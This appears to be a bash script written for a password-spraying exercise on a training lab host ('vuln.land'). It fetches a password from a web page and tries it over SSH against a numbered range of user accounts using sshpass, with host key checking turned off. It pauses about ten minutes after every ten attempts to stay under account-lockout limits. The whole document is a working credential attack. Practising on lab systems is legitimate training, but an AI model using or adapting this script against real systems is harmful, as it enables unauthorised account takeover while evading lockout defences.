#!/bin/bash

MYSTART=$1
MYEND=$2
MYCOUNTER=0
MYPASS=$(curl -k --resolve pwspray.vm.vuln.land:21:152.96.14.197 https://pwspray.vm.vuln.land | grep ssh -A 3 | tail -1 | cut -d'>' -f 2 | cut -d'<' -f 1)
echo "Password is set to: ${MYPASS}"


for i in $( seq ${MYSTART} ${MYEND}); do

  ((MYCOUNTER++))
  if [[ $MYCOUNTER -eq 10 ]]; then
    date
    echo "sleeping for 10 minutes and 15 seconds"
    sleep 615
    MYCOUNTER=0
  fi

  echo "Trying      user_${i}   :   $MYPASS     @    152.96.14.197   "
  sshpass -p $MYPASS ssh -o StrictHostKeyChecking=no user_${i}@152.96.14.197
  if [ $? -eq 0 ]; then echo "------ Found it: user_${i}  ---------"; exit 0; else echo "user_${i} did not work";fi


done
